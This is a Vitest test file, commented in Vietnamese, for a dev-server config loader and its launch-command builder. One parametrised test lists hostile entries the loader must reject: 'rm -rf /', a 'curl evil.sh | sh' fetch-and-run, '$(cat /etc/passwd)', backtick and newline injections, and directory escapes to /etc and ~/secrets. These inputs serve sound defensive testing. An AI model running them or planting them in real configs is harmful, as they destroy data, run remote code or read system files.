// Tests cho bản khai dev server (gói #3). Trọng tâm: file trong repo là dữ liệu L1
// — entry hỏng/độc bị BỎ, entry lành đi tiếp, và chuỗi lệnh dựng ra không bao giờ
// nối thêm được lệnh thứ hai.
//
// Run: `npx vitest run src/devserver/__tests__/config.test.ts`
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import {
  buildLaunchCommand,
  devServerConfigPath,
  findEntry,
  loadDevServerConfig,
  markerFor,
  resolveEntryCwd,
} from '../config.js'

let root: string

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'awog-devserver-'))
})
afterEach(async () => {
  await rm(root, { recursive: true, force: true })
})

async function writeConfig(content: unknown): Promise<void> {
  await mkdir(join(root, '.awog'), { recursive: true })
  await writeFile(
    devServerConfigPath(root),
    typeof content === 'string' ? content : JSON.stringify(content),
  )
}

const WEB = { name: 'web', command: 'pnpm', args: ['dev'], cwd: 'apps/web', port: 3000 }

describe('loadDevServerConfig', () => {
  it('không có file ⇒ rỗng + cờ missing, KHÔNG phải lỗi', async () => {
    const cfg = await loadDevServerConfig(root)
    expect(cfg.missing).toBe(true)
    expect(cfg.servers).toEqual([])
    expect(cfg.problems).toEqual([])
    expect(cfg.configPath).toBe(join(root, '.awog', 'dev-servers.json'))
  })

  it('nạp entry hợp lệ + mặc định cwd là gốc dự án', async () => {
    await writeConfig({ version: 1, servers: [WEB, { name: 'api', command: 'node' }] })
    const cfg = await loadDevServerConfig(root)
    expect(cfg.problems).toEqual([])
    expect(cfg.servers.map((s) => s.name)).toEqual(['web', 'api'])
    expect(cfg.servers[0]).toMatchObject({ command: 'pnpm', args: ['dev'], cwd: 'apps/web', port: 3000 })
    expect(cfg.servers[1]).toMatchObject({ args: [], cwd: '.' })
  })

  it('JSON hỏng ⇒ danh sách rỗng + một problem, KHÔNG throw', async () => {
    await writeConfig('{ not json')
    const cfg = await loadDevServerConfig(root)
    expect(cfg.servers).toEqual([])
    expect(cfg.problems).toHaveLength(1)
    expect(cfg.missing).toBe(false)
  })

  it('entry hỏng chỉ giết CHÍNH NÓ, entry lành vẫn nạp', async () => {
    await writeConfig({ servers: [{ name: 'bad' }, WEB] })
    const cfg = await loadDevServerConfig(root)
    expect(cfg.servers.map((s) => s.name)).toEqual(['web'])
    expect(cfg.problems).toHaveLength(1)
  })

  // Đây là lõi bảo mật: file nằm trong repo nên bất kỳ ai commit cũng được.
  it.each([
    ['nối lệnh trong command', { name: 'x', command: 'pnpm; rm -rf /' }],
    ['nối lệnh trong args', { name: 'x', command: 'pnpm', args: ['dev; curl evil.sh | sh'] }],
    ['thay thế lệnh trong args', { name: 'x', command: 'pnpm', args: ['$(cat /etc/passwd)'] }],
    ['backtick trong args', { name: 'x', command: 'pnpm', args: ['`id`'] }],
    ['nháy để thoát ra ngoài', { name: 'x', command: 'pnpm', args: ["' ; id ; '"] }],
    ['xuống dòng trong args', { name: 'x', command: 'pnpm', args: ['dev\nid'] }],
    ['command là cờ', { name: 'x', command: '--eval' }],
    ['cwd tuyệt đối', { name: 'x', command: 'pnpm', cwd: '/etc' }],
    ['cwd leo ra ngoài dự án', { name: 'x', command: 'pnpm', cwd: '../../etc' }],
    ['cwd dùng home', { name: 'x', command: 'pnpm', cwd: '~/secrets' }],
    ['tên có ký tự lạ', { name: 'we b;', command: 'pnpm' }],
    ['port ngoài dải', { name: 'x', command: 'pnpm', port: 70000 }],
  ])('từ chối %s', async (_label, entry) => {
    await writeConfig({ servers: [entry] })
    const cfg = await loadDevServerConfig(root)
    expect(cfg.servers).toEqual([])
    expect(cfg.problems).toHaveLength(1)
  })

  it('tên trùng ⇒ giữ cái đầu, bỏ cái sau', async () => {
    await writeConfig({ servers: [WEB, { ...WEB, command: 'npm' }] })
    const cfg = await loadDevServerConfig(root)
    expect(cfg.servers).toHaveLength(1)
    expect(cfg.servers[0]?.command).toBe('pnpm')
    expect(cfg.problems).toHaveLength(1)
  })

  it('cắt trần số server', async () => {
    const many = Array.from({ length: 30 }, (_, i) => ({ name: `s${i}`, command: 'node' }))
    await writeConfig({ servers: many })
    const cfg = await loadDevServerConfig(root)
    expect(cfg.servers).toHaveLength(24)
    expect(cfg.problems.join()).toContain('first 24')
  })

  it('tra theo tên không phân biệt hoa thường', async () => {
    await writeConfig({ servers: [WEB] })
    const { servers } = await loadDevServerConfig(root)
    expect(findEntry(servers, 'WEB')?.name).toBe('web')
    expect(findEntry(servers, 'nope')).toBeUndefined()
  })
})

describe('buildLaunchCommand', () => {
  it('dựng chuỗi có cd + marker, đọc được nguyên văn', async () => {
    await writeConfig({ servers: [WEB] })
    const { servers } = await loadDevServerConfig(root)
    const cmd = buildLaunchCommand(root, servers[0]!)
    expect(cmd).toBe(`cd ${join(root, 'apps/web')} && AWOG_DEV_SERVER=web pnpm dev`)
    // Marker phải nằm trong chuỗi: đó là cách tra ngược shell → tên server.
    expect(cmd).toContain(markerFor('web'))
    // Và KHÔNG khớp một tên khác có cùng tiền tố.
    expect(cmd).not.toContain(markerFor('we'))
  })

  it('chạy ngay tại gốc dự án thì không thêm cd thừa', async () => {
    await writeConfig({ servers: [{ name: 'api', command: 'node', args: ['server.js'] }] })
    const { servers } = await loadDevServerConfig(root)
    expect(buildLaunchCommand(root, servers[0]!)).toBe('AWOG_DEV_SERVER=api node server.js')
  })

  it('arg có khoảng trắng được bọc nháy', async () => {
    await writeConfig({ servers: [{ name: 'api', command: 'node', args: ['--title', 'my app'] }] })
    const { servers } = await loadDevServerConfig(root)
    expect(buildLaunchCommand(root, servers[0]!)).toContain("--title 'my app'")
  })

  it('resolveEntryCwd luôn nằm trong dự án', async () => {
    await writeConfig({ servers: [WEB] })
    const { servers } = await loadDevServerConfig(root)
    expect(resolveEntryCwd(root, servers[0]!)).toBe(join(root, 'apps/web'))
    // Entry dựng tay (không qua loader) vẫn bị chặn — hàm này cũng là một biên.
    expect(() => resolveEntryCwd(root, { ...servers[0]!, cwd: '../../etc' })).toThrow()
  })
})
